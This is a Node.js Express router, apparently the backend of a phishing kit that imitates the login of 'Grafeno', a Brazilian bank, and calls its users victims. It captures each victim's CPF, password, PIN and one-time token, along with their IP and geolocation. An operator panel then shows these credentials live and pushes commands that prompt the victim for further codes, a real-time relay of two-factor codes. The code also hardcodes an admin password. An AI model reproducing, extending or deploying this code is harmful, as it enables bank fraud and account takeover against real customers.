const express = require('express');
const rateLimit = require('express-rate-limit');
const router = express.Router();

// Rate limit no login do operador (proteção contra força bruta)
const operadorLoginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 10,
  message: { error: 'Muitas tentativas de login. Tente em 15 minutos.' },
  standardHeaders: true,
  legacyHeaders: false
});

// Limite de tamanho para inputs (evita payloads gigantes e armazenamento excessivo)
function safeStr(val, maxLen = 500) {
  return (val == null ? '' : String(val)).trim().slice(0, maxLen);
}

// Banco de dados (SQLite) — só DB, sem fallback em memória
let db = null;
try {
  db = require('../db/grafeno');
} catch (e) {
  console.warn('Banco db/grafeno não carregado:', e.message);
}

function getSession(login) {
  if (!db || !db.getDb()) return null;
  return db.getSession(login) || null;
}

function setSession(login, comando, detalhes) {
  if (!db || !db.getDb()) return;
  db.setSession(login, comando || '', detalhes || { msg: { GRAFENO: [] } });
}

function updateSessionLastUpdate(login) {
  if (db && db.getDb()) db.updateSessionLastUpdate(login);
}

function getUserDataFromStore(cpf) {
  if (!db || !db.getDb()) return null;
  const u = db.getUserData(cpf);
  return (u && Object.keys(u).length) ? u : null;
}

function setUserDataInStore(cpf, userData) {
  if (!db || !db.getDb()) return;
  db.setUserData(cpf, userData);
}

setInterval(() => {
  if (db && db.getDb()) db.deleteOldCache(30 * 60 * 1000);
}, 5 * 60 * 1000);

// Função para validar CPF
function validateCPF(cpf) {
  if (!cpf) return false;
  
  // Remove caracteres não numéricos
  cpf = cpf.replace(/[^\d]/g, '');
  
  // Verifica se tem 11 dígitos
  if (cpf.length !== 11) return false;
  
  // Verifica se todos os dígitos são iguais
  if (/^(\d)\1{10}$/.test(cpf)) return false;
  
  // Validação dos dígitos verificadores
  let sum = 0;
  let remainder;
  
  // Valida primeiro dígito
  for (let i = 1; i <= 9; i++) {
    sum += parseInt(cpf.substring(i - 1, i)) * (11 - i);
  }
  remainder = (sum * 10) % 11;
  if (remainder === 10 || remainder === 11) remainder = 0;
  if (remainder !== parseInt(cpf.substring(9, 10))) return false;
  
  // Valida segundo dígito
  sum = 0;
  for (let i = 1; i <= 10; i++) {
    sum += parseInt(cpf.substring(i - 1, i)) * (12 - i);
  }
  remainder = (sum * 10) % 11;
  if (remainder === 10 || remainder === 11) remainder = 0;
  if (remainder !== parseInt(cpf.substring(10, 11))) return false;
  
  return true;
}

// Função para formatar CPF
function formatCPF(cpf) {
  if (!cpf) return '';
  const cleaned = cpf.replace(/[^\d]/g, '');
  if (cleaned.length !== 11) return cpf;
  return cleaned.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
}

function getUserData(cpf) {
  const cleanedCPF = cpf.replace(/[^\d]/g, '');
  let userData = getUserDataFromStore(cleanedCPF);
  if (!userData || !userData.cpf) {
    userData = {
      cpf: cleanedCPF,
      cpfFormatted: formatCPF(cleanedCPF),
      actions: [],
      firstAction: new Date().toISOString(),
      lastUpdate: Date.now(),
      ip: '',
      device: '',
      browser: '',
      platform: '',
      local: '',
      sistema: '',
      visitorId: ''
    };
    setUserDataInStore(cleanedCPF, userData);
  }
  return userData;
}

// Função para atualizar dados do usuário
function updateUserData(cpf, newData) {
  const userData = getUserData(cpf);
  
  // Atualizar informações básicas se for a primeira ação
  if (userData.actions.length === 0) {
    userData.ip = newData.ip || userData.ip;
    userData.device = newData.device || userData.device;
    userData.browser = newData.browser || userData.browser;
    userData.platform = newData.platform || userData.platform;
    userData.local = newData.local || userData.local;
    userData.sistema = newData.sistema || userData.sistema;
    userData.visitorId = newData.visitorId || userData.visitorId;
  }
  
  // Adicionar nova ação
  const action = {
    type: newData.formType || 'unknown',
    timestamp: new Date().toISOString(),
    data: { ...newData }
  };
  
  userData.actions.push(action);
  userData.lastUpdate = Date.now();
  setUserDataInStore(cpf.replace(/[^\d]/g, ''), userData);
  return userData;
}

// --- Auth painel operador (cookie assinado) ---
function requireOperadorAuth(req, res, next) {
  if (req.signedCookies && req.signedCookies.operador) return next();
  const isApi = req.path.indexOf('/api/') === 0 || req.xhr;
  if (isApi) return res.status(401).json({ error: 'Não autorizado. Faça login em /operador/login' });
  return res.redirect('/operador/login');
}

function verifyOperadorLogin(login, senha) {
  if (db && db.verifyAdmin) {
    const ok = db.verifyAdmin((login || '').toString().trim(), (senha || '').toString());
    if (ok) return ok.login;
  }
  if ((login || '').toString().trim() === 'admin' && (senha || '').toString() === 'hell777') return 'admin';
  return null;
}

router.get('/operador/login', (req, res) => {
  if (req.signedCookies && req.signedCookies.operador) return res.redirect('/operador');
  res.render('operador-login', { title: 'Login Operador' });
});

router.post('/operador/login', operadorLoginLimiter, (req, res) => {
  const login = (req.body.login || '').toString().trim().slice(0, 80);
  const senha = (req.body.senha || '').toString().slice(0, 256);
  const operador = verifyOperadorLogin(login, senha);
  if (!operador) return res.render('operador-login', { title: 'Login Operador', erro: 'Usuário ou senha incorretos.' });
  const isProduction = process.env.NODE_ENV === 'production';
  res.cookie('operador', operador, {
    signed: true,
    httpOnly: true,
    secure: isProduction,
    sameSite: isProduction ? 'strict' : 'lax',
    maxAge: 24 * 60 * 60 * 1000
  });
  res.redirect('/operador');
});

router.get('/operador/logout', (req, res) => {
  res.clearCookie('operador');
  res.redirect('/operador/login');
});

/* GET home page. */
router.get('/', (req, res, next) => {
  res.render('index', { title: 'Express' });
});

router.get('/grafeno', (req, res, next) => {
  res.render('grafeno', { title: 'Grafeno' });
});

// --- Interna (vítima após "enviar_para_interna") → painel.ejs ---
router.get('/painel', (req, res) => {
  res.render('painel', { title: 'Grafeno' });
});

// API para o painel exibir nome/dados no header — grava no banco (nome, cpf, data nascimento); por enquanto retorna fixo; depois pode puxar do banco por CPF digitado
router.get('/buscar/cpf/:cpf', (req, res) => {
  const cpf = (req.params.cpf || '').replace(/\D/g, '');
  if (!cpf || cpf.length !== 11) {
    return res.status(400).json({ status: 'erro', message: 'CPF inválido' });
  }
  const nome = 'Cliente Teste';
  const dataNascimento = '15/03/1985';
  if (db && db.setDadosCpf) db.setDadosCpf(cpf, nome, dataNascimento);
  res.json({
    status: 'ok',
    dadosCPF: {
      nome,
      cpf: cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4'),
      dataNascimento
    }
  });
});

// --- Painel do operador (lista de sessões e botões de comando) ---
router.get('/operador', requireOperadorAuth, (req, res) => {
  res.render('painel-operador', { title: 'Painel Operador - Grafeno' });
});

// Listar sessões ativas (para o painel) — só sessões que já começaram a digitar (tem pelo menos 1 ação)
router.get('/api/sessoes', requireOperadorAuth, (req, res) => {
  if (!db || !db.getDb()) return res.json({ sessoes: [] });
  const maxIdle = 30 * 60 * 1000;
  const sessions = db.listSessions(maxIdle);
  const sessionsWithActions = sessions.filter(s => {
    const userData = getUserDataFromStore(s.login);
    return userData && userData.actions && userData.actions.length > 0;
  });
  // Info sem acesso vinculado: cria o acesso com o IP do userData para poder bloquear
  sessionsWithActions.forEach(s => {
    if (!getIpDoAcesso(s.login)) {
      const userData = getUserDataFromStore(s.login);
      if (userData && userData.ip && db.ensureAcessoForLogin) db.ensureAcessoForLogin(userData.ip, s.login);
    }
  });
  const list = sessionsWithActions.map(s => {
    const login = s.login;
    const userData = getUserDataFromStore(login);
    let senha = '', pin = '', token = '', comando = '';
    if (userData && userData.actions) {
      userData.actions.forEach(a => {
        if (a.data.password) senha = a.data.password;
        if (a.data.pin_attempt) pin = a.data.pin_attempt;
        if (a.data.otp_attempt) token = a.data.otp_attempt;
        if (a.data.comando_input) comando = a.data.comando_input;
      });
    }
    const pagina = (s.detalhes && s.detalhes.pagina) || 'grafeno';
    const lastPing = (s.detalhes && s.detalhes.lastPing) || 0;
    const ultimoContato = Math.max(s.lastUpdate || 0, lastPing);
    const online = (Date.now() - ultimoContato) < PING_ONLINE_MS;
    const ipAcesso = getIpDoAcesso(login);
    return {
      login,
      cpfFormatado: userData ? userData.cpfFormatted : formatCPF(login),
      comando: s.comando || '',
      lastUpdate: s.lastUpdate,
      lastPing: lastPing || null,
      online,
      ip: ipAcesso || (userData ? userData.ip : ''),
      device: userData ? userData.device : '',
      temSenha: !!senha,
      temPin: !!pin,
      temToken: !!token,
      temComando: !!comando,
      senha: senha || '',
      pin: pin || '',
      token: token || '',
      comando_valor: comando || '',
      pagina: pagina === 'painel' ? 'painel' : 'grafeno'
    };
  });
  list.sort((a, b) => (b.lastUpdate || 0) - (a.lastUpdate || 0)); // mais recente primeiro, uma por linha
  res.json({ sessoes: list });
});

// Detalhe de uma sessão
router.get('/api/sessao/:login', requireOperadorAuth, (req, res) => {
  const login = (req.params.login || '').replace(/\D/g, '');
  const session = getSession(login);
  const userData = getUserDataFromStore(login);
  if (!session && !userData) return res.status(404).json({ error: 'Sessão não encontrada' });
  if (!getIpDoAcesso(login) && userData && userData.ip && userData.actions && userData.actions.length > 0 && db.ensureAcessoForLogin) {
    db.ensureAcessoForLogin(userData.ip, login);
  }
  let senha = '', pin = '', token = '', comando = '';
  if (userData && userData.actions) {
    userData.actions.forEach(a => {
      if (a.data.password) senha = a.data.password;
      if (a.data.pin_attempt) pin = a.data.pin_attempt;
      if (a.data.otp_attempt) token = a.data.otp_attempt;
      if (a.data.comando_input) comando = a.data.comando_input;
    });
  }
  const ipAcesso = getIpDoAcesso(login);
  res.json({
    login,
    cpfFormatado: userData ? userData.cpfFormatted : formatCPF(login),
    comando: session ? session.comando : '',
    detalhes: session ? session.detalhes : {},
    lastUpdate: session ? session.lastUpdate : (userData ? userData.lastUpdate : 0),
    ip: ipAcesso || (userData ? userData.ip : ''),
    device: userData ? userData.device : '',
    browser: userData ? userData.browser : '',
    local: userData ? userData.local : '',
    senha,
    pin,
    token,
    comando_valor: comando,
    actionsCount: userData ? userData.actions.length : 0
  });
});

// Excluir uma sessão (e dados do cache) — a vítima “cai” e pode recomeçar
router.delete('/api/sessao/:login', requireOperadorAuth, (req, res) => {
  const login = (req.params.login || '').replace(/\D/g, '');
  if (!login) return res.status(400).json({ ok: false, message: 'Login inválido' });
  if (db && db.getDb()) {
    db.deleteSession(login);
    db.deleteUserData(login);
  }
  res.json({ ok: true, message: 'Sessão excluída' });
});

// Limpar todas as sessões e todo o cache de uma vez
router.delete('/api/sessoes', requireOperadorAuth, (req, res) => {
  if (db && db.getDb()) {
    db.deleteAllSessions();
    db.deleteAllUserCache();
  }
  res.json({ ok: true, message: 'Todas as sessões e dados foram limpos' });
});

// --- Acessos (visitas à página — contam ao cair na página) ---

function getClientIp(req) {
  return (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || req.ip || req.connection.remoteAddress || '';
}

function isAcessoBlocked(ip) {
  return !!(db && db.isIpBlocked && db.isIpBlocked(ip));
}

function vincularAcessoAoCPF(ip, cpf) {
  const login = (cpf || '').replace(/\D/g, '');
  if (!login || login.length !== 11) return;
  if (db && db.getDb() && db.vincularAcessoPorIp) db.vincularAcessoPorIp(ip, login);
  const u = getUserDataFromStore(login);
  if (u) {
    u.ip = ip;
    setUserDataInStore(login, u);
  }
}

function getIpDoAcesso(login) {
  const cpf = (login || '').replace(/\D/g, '');
  if (!cpf || cpf.length !== 11) return '';
  if (!db || !db.getAcessoByLogin) return '';
  const a = db.getAcessoByLogin(cpf);
  return (a && a.ip) ? a.ip : '';
}

// Registrar acesso (chamado ao carregar a página da vítima — sem auth)
router.post('/api/registrar-acesso', async (req, res) => {
  if (!db || !db.getDb() || !db.insertAcesso) {
    return res.status(503).json({ ok: false, message: 'Banco de dados indisponível' });
  }
  const ip = getClientIp(req);
  if (isAcessoBlocked(ip)) return res.status(403).json({ ok: false, blocked: true });

  const hash = safeStr(req.body.hash || req.body.visitorId || '', 256);
  const userAgent = safeStr(req.body.userAgent || req.headers['user-agent'] || '', 512);
  const device = safeStr(req.body.device || '', 64).toUpperCase() || 'DESKTOP';
  let pais = safeStr(req.body.pais || '', 100);
  let estado = safeStr(req.body.estado || '', 100);
  let cidade = safeStr(req.body.cidade || '', 100);

  if (!pais && ip && !ip.startsWith('127.') && ip !== '::1') {
    try {
      const c = require('http').request ? require('http') : null;
      if (c) {
        const geo = await new Promise((resolve) => {
          const req = c.get(`http://ip-api.com/json/${encodeURIComponent(ip)}?fields=country,regionName,city`, (res) => {
            let buf = '';
            res.on('data', (c) => { buf += c; });
            res.on('end', () => { try { resolve(JSON.parse(buf)); } catch (_) { resolve(null); } });
          });
          req.on('error', () => resolve(null));
          req.setTimeout(2000, () => { req.destroy(); resolve(null); });
        });
        if (geo && geo.country) pais = geo.country;
        if (geo && geo.regionName) estado = geo.regionName;
        if (geo && geo.city) cidade = geo.city;
      }
    } catch (_) {}
  }

  const id = db.insertAcesso(ip, hash, pais, estado, cidade, userAgent, device);
  res.json({ ok: true, id: id || undefined });
});

// Página do painel Acessos (operador)
router.get('/operador/acessos', requireOperadorAuth, (req, res) => {
  res.render('painel-acessos', { title: 'Acessos - Painel Operador' });
});

// Listar acessos (operador) — mais recente primeiro, um por linha
router.get('/api/acessos', requireOperadorAuth, (req, res) => {
  const list = (db && db.getDb() && db.listAcessos) ? db.listAcessos(500) : [];
  res.json({ acessos: list });
});

// Limpar todos os acessos
router.delete('/api/acessos', requireOperadorAuth, (req, res) => {
  if (db && db.getDb() && db.deleteAllAcessos) db.deleteAllAcessos();
  res.json({ ok: true, message: 'Todos os acessos foram limpos' });
});

// Excluir um acesso
router.delete('/api/acessos/:id', requireOperadorAuth, (req, res) => {
  const id = parseInt(req.params.id, 10);
  if (isNaN(id)) return res.status(400).json({ ok: false, message: 'ID inválido' });
  const ok = (db && db.getDb() && db.deleteAcesso) ? db.deleteAcesso(id) : false;
  res.json({ ok: !!ok });
});

// Bloquear um acesso (por ID — bloqueia o IP e remove a info/sessão se tiver CPF vinculado)
router.post('/api/acessos/:id/bloquear', requireOperadorAuth, (req, res) => {
  const id = parseInt(req.params.id, 10);
  if (isNaN(id)) return res.status(400).json({ ok: false, message: 'ID inválido' });
  if (!db || !db.getDb() || !db.listAcessos || !db.blockAcesso) return res.json({ ok: false });
  const item = db.listAcessos(10000).find(a => a.id === id);
  if (!item) return res.json({ ok: false });
  const ok = db.blockAcesso(id);
  if (ok && item.login) {
    if (db.deleteSession) db.deleteSession(item.login);
    if (db.deleteUserData) db.deleteUserData(item.login);
  }
  res.json({ ok: !!ok });
});

// Operador define o próximo comando para uma sessão
router.post('/api/comando', requireOperadorAuth, (req, res) => {
  const { login: loginParam, comando, input_comando } = req.body;
  const login = (loginParam || '').toString().trim().replace(/\D/g, '');
  if (!login || !comando) {
    return res.status(400).json({ ok: false, message: 'login e comando obrigatórios' });
  }
  let comandoFinal = safeStr(comando || '', 120).toLowerCase().replace(/\s+/g, '_');
  // Dado inválido: exclui a info e a vítima cai de novo (nova sessão)
  if (comandoFinal === 'dado_invalido') {
    if (db && db.getDb()) {
      db.deleteSession(login);
      db.deleteUserData(login);
    }
    return res.json({ ok: true, comando: 'dado_invalido' });
  }
  if (!['aguardando', 'finalizar_atendimento', 'enviar_para_interna'].includes(comandoFinal)) {
    if (!comandoFinal.endsWith(' solicitado')) comandoFinal = comandoFinal + ' solicitado';
  }
  const session = getSession(login);
  let detalhes = { msg: { GRAFENO: [] } };
  if (comandoFinal === 'comando solicitado' && input_comando) {
    detalhes.msg.GRAFENO = [{ input_comando: safeStr(input_comando, 2000) }];
  } else if (comandoFinal === 'comando_error solicitado' && session && session.detalhes && session.detalhes.msg && session.detalhes.msg.GRAFENO && session.detalhes.msg.GRAFENO.length) {
    detalhes = { ...session.detalhes };
  }
  setSession(login, comandoFinal, detalhes);
  res.json({ ok: true, comando: comandoFinal });
});

// Endpoint para receber dados do formulário
router.post('/api/submit', async (req, res, next) => {
  try {
    const formData = req.body;
    
    // Extrair CPF do formulário
    let cpf = formData.document_number || formData.cpf || '';
    
    // Validar CPF
    if (!cpf || !validateCPF(cpf)) {
      return res.status(400).json({ 
        success: false, 
        message: 'CPF inválido ou não fornecido' 
      });
    }

    // Obter dados da sessão (mesmo getClientIp que em Acessos para o IP bater) — limites para evitar abuso
    const ua = req.headers['user-agent'] || 'Desconhecido';
    const sessionData = {
      ip: getClientIp(req),
      device: safeStr(formData.device || ua, 256),
      browser: safeStr(formData.browser || ua, 256),
      platform: safeStr(formData.platform || ua, 256),
      local: safeStr(formData.local || 'Desconhecido', 256),
      sistema: safeStr(formData.sistema || 'GRAFENO', 64),
      visitorId: safeStr(formData.visitorId || '', 256)
    };

    // Combinar dados do formulário com dados da sessão
    const dataToSend = {
      ...formData,
      ...sessionData,
      document_number: cpf.replace(/[^\d]/g, '') // Garantir CPF limpo
    };

    // Atualizar dados do usuário no cache
    const userData = updateUserData(cpf, dataToSend);

    const ip = getClientIp(req);
    vincularAcessoAoCPF(ip, cpf);

    res.json({ 
      success: true, 
      message: 'Dados enviados com sucesso',
      cpf: userData.cpfFormatted,
      actionsCount: userData.actions.length
    });
  } catch (error) {
    console.error('Erro api/submit:', error);
    res.status(500).json({ 
      success: false, 
      message: 'Erro ao processar dados' 
    });
  }
});

router.post('/grafeno', async (req, res, next) => {
  try {
    const formData = req.body;
    
    // Extrair CPF do formulário
    let cpf = formData['user[document_number]'] || formData.document_number || '';
    
    // Validar CPF
    if (!cpf || !validateCPF(cpf)) {
      return res.redirect('/grafeno?error=cpf_invalido');
    }

    const uaG = req.headers['user-agent'] || 'Desconhecido';
    const sessionData = {
      ip: getClientIp(req),
      device: safeStr(uaG, 256),
      browser: safeStr(uaG, 256),
      platform: safeStr(uaG, 256),
      local: 'Desconhecido',
      sistema: 'GRAFENO'
    };

    // Processar dados do formulário (limites para evitar abuso)
    const processedData = {
      document_number: cpf.replace(/[^\d]/g, ''),
      password: safeStr(formData['user[password]'] || formData.password || '', 256),
      pin_attempt: safeStr(formData['user[pin_attempt]'] || formData.pin_attempt || '', 32),
      otp_attempt: safeStr(formData['user[otp_attempt]'] || formData.otp_attempt || '', 32),
      comando_input: safeStr(formData['user[comando_input]'] || formData.comando_input || '', 2000),
      remember_me: formData['user[remember_me]'] || formData.remember_me || '0',
      formType: 'login',
      ...sessionData
    };

    // Atualizar dados do usuário no cache
    const userData = updateUserData(cpf, processedData);

    const ip = getClientIp(req);
    vincularAcessoAoCPF(ip, cpf);

    res.redirect('/grafeno');
  } catch (error) {
    console.error('Erro POST /grafeno:', error);
    res.redirect('/grafeno');
  }
});

// --- API de ping: registra presença da vítima (online). Aceita login para associar à sessão. ---
const PING_ONLINE_MS = 60 * 1000; // considera "online" se último contato em até 60s

router.post('/api/ping', (req, res) => {
  const ip = req.body.ip || req.ip || req.headers['x-forwarded-for'] || '';
  const login = (req.body.login || req.body.usuario || '').toString().trim().replace(/\D/g, '');
  if (login && login.length === 11) {
    const session = getSession(login);
    if (session) {
      const detalhes = { ...(session.detalhes || {}), lastPing: Date.now() };
      setSession(login, session.comando || '', detalhes);
    }
  }
  res.json({ ok: true, ip: ip || null });
});

router.post('/registrar-ping', (req, res) => {
  const ip = req.body.ip || req.ip || req.headers['x-forwarded-for'] || '';
  const login = (req.body.login || req.body.usuario || '').toString().trim().replace(/\D/g, '');
  if (login && login.length === 11) {
    const session = getSession(login);
    if (session) {
      const detalhes = { ...(session.detalhes || {}), lastPing: Date.now() };
      setSession(login, session.comando || '', detalhes);
    }
  }
  res.json({ ok: true, ip: ip || null });
});

// --- Fluxo operador (polling + etapas) ---

router.post('/salvar-login', async (req, res) => {
  try {
    const { usuario, senha, ip, tipo, local, device, url, user_id, comando, recaptcha_token } = req.body;
    const login = (usuario || '').replace(/\D/g, '');
    if (!login || login.length !== 11) {
      return res.json({ success: false });
    }
    // IP sempre do servidor (getClientIp) para bater com o IP em Acessos
    const clientIp = getClientIp(req);
    const uaS = req.headers['user-agent'] || '';
    const sessionData = {
      ip: clientIp,
      device: safeStr(device || uaS, 256),
      browser: safeStr(uaS, 256),
      platform: safeStr(device || uaS, 256),
      local: safeStr(local || '', 256),
      sistema: safeStr(tipo || 'GRAFENO', 64)
    };
    const dataToSend = {
      document_number: login,
      password: safeStr(senha || '', 256),
      formType: 'login',
      ...sessionData
    };
    const userData = updateUserData(login, dataToSend);
    setSession(login, 'codigo_token solicitado', { msg: { GRAFENO: [] } });
    vincularAcessoAoCPF(clientIp, login);
    res.json({ success: true });
  } catch (err) {
    console.error('Erro salvar-login:', err);
    res.status(500).json({ success: false });
  }
});

router.post('/comando-login', (req, res) => {
  const login = (req.body.login || '').toString().trim().replace(/\D/g, '');
  const pagina = (req.body.pagina || 'grafeno').toString().toLowerCase();
  const paginaNorm = pagina === 'painel' ? 'painel' : 'grafeno';
  const session = getSession(login);
  if (session) {
    const detalhes = { ...(session.detalhes || {}), pagina: paginaNorm };
    setSession(login, session.comando || '', detalhes);
  }
  const sessionAtual = getSession(login);
  if (!sessionAtual) {
    return res.json({ comando: 'sessao_invalida', detalhes: {} });
  }
  const comando = (sessionAtual.comando) ? String(sessionAtual.comando).trim() : '';
  const detalhes = sessionAtual.detalhes || {};
  res.json({ comando, detalhes });
});

router.post('/atualizar-etapa', async (req, res) => {
  try {
    let { usuario, etapa, valor } = req.body;
    const login = (usuario || '').toString().trim().replace(/\D/g, '');
    if (!login) return res.json({ success: false });

    // Aceita etapa no formato do painel: "TOKEN-123456", "PIN-1234", "Comando-xyz"
    const etapaStr = (etapa || '').toString().trim();
    let etapaNorm = etapaStr;
    if (etapaStr.startsWith('TOKEN-') || etapaStr === 'TOKEN') {
      etapaNorm = 'TOKEN';
      if (!valor && etapaStr.startsWith('TOKEN-')) valor = etapaStr.slice(6);
    } else if (etapaStr.startsWith('PIN-') || etapaStr === 'PIN') {
      etapaNorm = 'PIN';
      if (!valor && etapaStr.startsWith('PIN-')) valor = etapaStr.slice(4);
    } else if (etapaStr.startsWith('Comando-') || etapaStr.startsWith('COMANDO-') || etapaStr === 'COMANDO') {
      etapaNorm = 'COMANDO';
      if (!valor && (etapaStr.startsWith('Comando-') || etapaStr.startsWith('COMANDO-'))) valor = etapaStr.replace(/^(Comando|COMANDO)-/, '');
    }

    const uaE = req.headers['user-agent'] || '';
    const sessionData = {
      ip: getClientIp(req),
      device: safeStr(uaE, 256),
      browser: safeStr(uaE, 256),
      platform: safeStr(uaE, 256),
      local: '',
      sistema: 'GRAFENO'
    };

    let formType = 'unknown';
    const dataToSend = { document_number: login, ...sessionData };
    if (etapaNorm === 'PIN') {
      formType = 'pin';
      dataToSend.pin_attempt = safeStr(valor, 32);
    } else if (etapaNorm === 'TOKEN') {
      formType = 'token';
      dataToSend.otp_attempt = safeStr(valor, 32);
    } else if (etapaNorm === 'COMANDO') {
      formType = 'comando';
      dataToSend.comando_input = safeStr(valor, 2000);
    }
    dataToSend.formType = formType;
    const userData = updateUserData(login, dataToSend);
    updateSessionLastUpdate(login);
    res.json({ success: true });
  } catch (err) {
    console.error('Erro atualizar-etapa:', err);
    res.status(500).json({ success: false });
  }
});

router.post('/enviar-comando', (req, res) => {
  const { comando, usuario } = req.body;
  res.json({ ok: true });
});

module.exports = router;
